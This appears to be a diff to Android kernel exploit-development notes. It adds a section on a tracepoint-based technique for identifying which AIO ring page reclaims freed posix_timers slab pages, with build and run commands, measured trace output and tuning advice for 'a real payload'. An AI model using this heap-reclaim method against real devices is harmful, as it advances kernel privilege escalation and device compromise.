@@ -124,3 +124,63 @@ Caveats:
 - Rootd started *after* KernelSU restores Enforcing still works (socket + peercred),
   but some commands inside the shell domain are constrained; a v3 design would
   rely on KernelSU's `su` for post-root work instead of the shell-domain rootd.
+
+## C — PFN-verified reclaim (`tp_reclaim.c`)
+
+Goal: without kprobes or perf, tell **which AIO ring page owns a freed
+`posix_timers` slab page**, so a real payload can stop guessing.
+
+Method:
+
+1. `kmem_cache_alloc` tracepoint + raw trace: `call_site == alloc_posix_timer +
+   slide`, `bytes_req == 0x180`, `pid == self` -> k_itimer object addresses;
+2. turn every address into page-frame numbers: the containing slab page
+   (`addr & ~0xfff`) and the page holding `k_itimer.it` (`addr + 0xe0`), with
+   order-1 slabs recording the even pfn;
+3. enable `mm_page_free`, `mm_page_alloc` and
+   `filemap:mm_filemap_add_to_page_cache`, then arm the timers, delete them and
+   spray `io_setup(1)` rings on every CPU with pacing;
+4. parse the per-CPU text traces: the N-th filemap line of CPU c is ring c/N.
+   A watched pfn appearing there means that ring owns one of the slab pages.
+
+Build and run:
+
+```bash
+NDK=/path/to/android-ndk-r28c/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang
+$NDK -O2 -pthread -o tp_reclaim tp_reclaim.c
+adb push tp_reclaim /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/tp_reclaim
+adb shell /data/local/tmp/tp_reclaim
+```
+
+Measured on yingtian / `6.18.21-android17-5-g805aa6adea19`, cold boot
+`f545f2f7` (Enforcing, shell uid 2000, no KernelSU), first run after boot:
+
+```
+SLIDE 0x2c4e200000
+TIMERS created=1584 addrs=1584
+WATCH 152 node_watch=152
+RINGS 12000
+CPU0 rings=1200 seen=592 watch=0      <- trace buffer drops on busy CPUs
+CPU1 rings=1200 seen=688 watch=33
+CPU3 rings=1200 seen=624 watch=23
+CPU8 rings=1200 seen=1200 watch=1
+CPU9 rings=1200 seen=1200 watch=8
+FILEMAP seen=9673 watch_hits=65 node_hits=65
+MATCH cpu=8 ring=492 ctx=0x708446f000 pfn=0x334fa3 node_page=1 magic=0xa10a10a1
+```
+
+So 65 rings ended up owning one of the 152 watched node pages, and the ring
+could be identified and validated by its io_event magic. An earlier
+single-threaded run (3500 rings) showed the same effect with 26 hits.
+
+**Limits measured:**
+
+- repeating the experiment on the same boot yields `watch_hits=0`: every run
+  destroys 12,000 AIO contexts at exit and frees ~48 MB of pages, so the next
+  rings reuse those instead of the freshly freed slab pages. A real payload
+  sprays once, so this is acceptable - but it means "run it twice to check"
+  does not work.
+- per-CPU trace buffers are small: busy CPUs lose filemap lines (`seen <
+  rings`). The matcher must require `seen == rings` for a CPU before trusting
+  it, and a real payload should spray fewer rings (hundreds) or raise
+  `buffer_size_kb`.
